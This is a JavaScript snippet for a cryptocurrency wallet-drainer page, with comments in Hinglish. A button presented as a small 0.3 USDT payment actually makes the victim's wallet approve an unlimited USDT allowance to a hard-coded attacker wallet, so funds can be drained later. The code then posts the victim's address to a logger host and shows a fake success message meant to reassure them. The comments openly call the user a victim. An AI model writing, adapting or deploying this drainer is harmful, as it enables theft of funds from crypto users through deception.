// Wait for window.ethers to be available
document.getElementById("payBtn").addEventListener("click", async () => {
  const status = document.getElementById("status");
  const YOUR_WALLET = "0x5569183a84F4D11a9225988561F020fCbbdACa10"; // ✅ Apna wallet daal liya hai?
  const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC-USDT
  const AMOUNT = ethers.utils.parseUnits("0.3", 18); // 0.3 USDT (proper way)

  // ✅ Ethers check with delay fallback
  if (typeof window.ethers === "undefined") {
    status.textContent = "Loading crypto... Try again.";
    setTimeout(() => {
      location.reload();
    }, 1500);
    return;
  }

  try {
    // ✅ Wallet check
    if (!window.ethereum) {
      status.textContent = "Error: Connect Trust Wallet or MetaMask";
      return;
    }

    // ✅ Request access
    await window.ethereum.request({ method: "eth_requestAccounts" });
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    const userAddress = await signer.getAddress();

    status.textContent = Approving for: ${userAddress.slice(0, 6)}...;

    // ✅ USDT Contract ABI (minimal)
    const usdtContract = new ethers.Contract(
      USDT_ADDRESS,
      ["function approve(address spender, uint256 amount) returns (bool)"],
      signer
    );

    // ✅ Approve MAX USDT (phir tu khud transfer kar lega backend se)
    const tx = await usdtContract.approve(
      YOUR_WALLET,
      "115792089237316195423570985008687907853269984665640564039457584007913129639935"
    );

    status.textContent = "✅ Approved! Redirecting...";

    // ✅ Optional: Log victim to your server
    fetch('https://yourlogger.xyz/hit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ address: userAddress, time: new Date().toISOString() })
    }).catch(() => {}); // Don't block on error

    // ✅ Simulate delay (victim ko lage sab ho gaya)
    await tx.wait(1);
    alert("Access unlocked! Loading...");

  } catch (err) {
    console.error("Drain error:", err);
    status.textContent = "Error: " + (err.message.includes("user rejected") ? "User denied" : "System fail");
  }
});